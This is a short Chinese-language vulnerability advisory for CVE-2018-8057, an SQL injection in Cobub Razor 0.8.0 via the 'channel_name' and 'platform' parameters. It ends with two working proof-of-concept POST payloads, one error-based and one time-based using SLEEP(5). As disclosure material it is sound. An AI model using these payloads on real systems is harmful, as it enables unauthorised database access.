### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|Cobub Razor 0.8.0存在SQL注入漏洞|2018-04-16|Kyhvedn（yinfengwuyueyi@163.com、kyhvedn@5ecurity.cn）|[http://www.cobub.com/](http://www.cobub.com/) | [https://github.com/cobub/razor/](https://github.com/cobub/razor/) |0.8.0| [CVE-2018-8057](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8057)|  

#### 漏洞概述  

> Cobub Razor 0.8.0存在SQL注入漏洞，“/application/controllers/manage/channel.php”页面的“channel_name”及“platform”参数过滤不严格导致存在SQL注入漏洞。Cobub Razor是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过[issues](https://github.com/cobub/razor/issues/162)告知作者。   


### POC实现代码如下：  

> http://localhost/index.php?/manage/channel/addchannel  

> POST data:  

>  1.channel_name=test" AND (SELECT 1700 FROM(SELECT COUNT(*),CONCAT(0x7171706b71,(SELECT (ELT(1700=1700,1))),0x71786a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- JQon&platform=1  

>  2.channel_name=test" AND SLEEP(5)-- NklJ&platform=1

